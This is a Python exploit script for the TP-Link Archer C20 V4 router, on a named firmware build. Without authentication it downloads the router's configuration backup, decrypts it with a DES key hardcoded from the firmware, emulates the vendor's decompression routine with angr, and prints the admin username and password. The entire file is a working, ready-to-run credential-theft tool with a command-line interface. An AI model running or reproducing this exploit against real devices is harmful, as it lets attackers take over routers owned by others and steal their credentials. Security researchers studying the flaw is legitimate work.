#!/usr/bin/env python
# Originally written by DuSu, Modifiied by DrmnSamoLiu

import argparse
from Crypto.Cipher import DES
from Crypto.Hash import MD5
import angr
import struct
import requests

HARDWARE = 'TP-Link Archer C20 V4'
HW_VERSION = 'Hardware Version=v4 00000004'
FW_VERSION = 'Firmware Version=0.9.1 4.16 v009e.0 Build 191025 Rel.41303n'
DEFAULT_NAME = 'admin'
DEFAULT_PWD = 'admin'
HOST = '192.168.0.1'

def u32(s):
	return struct.unpack("<I", s)[0]

def get_backup(host):
	url = 'http://' + host
	headers = {'Referer': url}
	r = requests.get(url + '/cgi/conf.bin', headers=headers)
	return r.content

def decrypt(cipher):
	DES_KEY = b'\x47\x8d\xa5\x0b\xf9\xe3\xd2\xcf' # from /lib/libcmm.so @ 0xe1174
	des = DES.new(DES_KEY, DES.MODE_ECB)
	return des.decrypt(cipher)

def checked_md5_data(compressed):
	md5 = compressed[:16]
	data = compressed[16:]
	assert md5 == MD5.new(data).digest()
	return data

def uncompress(compressed):
	# fetch data to be uncompressed, its size, and check md5 hash
	comp_sz = len(compressed)
	uncomp_sz = u32(compressed[:4])

	# start the angr machinery
	proj = angr.Project('libcutil.so', load_options={'auto_load_libs': False})
	uncompress_start = proj.loader.find_symbol('cen_uncompressBuff').rebased_addr
	UNCOMP_END_OFFSET = 0x97f4 # we'll stop angr's simulation at: jr $ra 
	uncompress_end = UNCOMP_END_OFFSET + proj.loader.main_object.mapped_base
	state = proj.factory.blank_state(addr=uncompress_start,
		add_options=angr.options.unicorn)

	# write the compressed data on stack (word/32bit aligned address)
	state.regs.sp -= comp_sz + (4 - (comp_sz % 4))
	comp = state.regs.sp
	state.memory.store(comp, compressed)

	# "allocate" room for uncompressed data on stack (word/32bit aligned address)
	state.regs.sp -= uncomp_sz + (4 - (uncomp_sz % 4))
	uncomp = state.regs.sp

	# set up registers
	state.regs.a0 = comp # first argument to cen_uncompressBuff()
	state.regs.a1 = uncomp # second argument to cen_uncompressBuff()
	state.regs.a2 = uncomp_sz # third argument to cen_uncompressBuff()
	state.regs.t9 = uncompress_start # as usual for MIPS

	# launch the simulation
	simgr = proj.factory.simulation_manager(state)
	paths = simgr.explore(find=uncompress_end)

	# get the end state, and the config (uncompressed data)
	state_end = paths.found[0]
	config = state_end.solver.eval(state_end.memory.load(uncomp,
		uncomp_sz, angr.archinfo.Endness.LE), cast_to=bytes)
	try:
	    with open('./uncompressconf.txt','wb+') as out:
	        out.write(config)
	    out.close()
	    print('\n'+'[+] Uncompressed file [uncompressconf.txt] written to current directory.')
	except:
	    print('\n'+'[x] Write Uncompressed file failed.')
	return config.decode('gb2312')

def get_creds(config):
	# extract the admin name from the config
	XML_NAME = '<AdminName val='
	if config.find(XML_NAME) == -1:
		name = DEFAULT_NAME
	else:
		name_start = config.find(XML_NAME) + len(XML_NAME)
		name_end = name_start + config[name_start:].find(' />')
		name = config[name_start:name_end]
	# extract the admin password from the config
	XML_PWD = '<AdminPwd val='
	if config.find(XML_PWD) == -1:
		pwd = DEFAULT_PWD
	else:
		pwd_start = config.find(XML_PWD) + len(XML_PWD)
		pwd_end = pwd_start + config[pwd_start:].find(' />')
		pwd = config[pwd_start:pwd_end]
	return (name, pwd)

def exploit(host, filename, output_config):
	if filename is None:
		cipher = get_backup(host)
	else:
		with open(filename, 'rb') as f:
			cipher = f.read()
	plain = decrypt(cipher)
	compressed = checked_md5_data(plain)
	config = uncompress(compressed)
	if output_config:
		print(config)
	else:
		creds = get_creds(config)
		print('\n'+'[+] Credentials are %s' % ':'.join(creds))

def main():
	parser = argparse.ArgumentParser(
		description = '{}\n{}\n{}\nUnauthenticated Configuration retrieval (including Admin password)'.format(HARDWARE, HW_VERSION, FW_VERSION),
		formatter_class = argparse.RawTextHelpFormatter,
		usage = './%(prog)s <options>')
	parser.add_argument('-i', '--host',
		default = HOST,
		action = 'store',
		help = 'ip address (default: %(default)s)')
	parser.add_argument('-f', '--file',
		default = None,
		action = 'store',
		help = 'use configuration file instead of ip address (default: %(default)s)')
	parser.add_argument('-c', '--config',
		default = False,
		action = 'store_true',
		help = 'output the whole router configuration, not only credentials (default: %(default)s)')
	args = parser.parse_args()
	exploit(args.host, args.file, args.config)

if __name__ == '__main__':
	main()
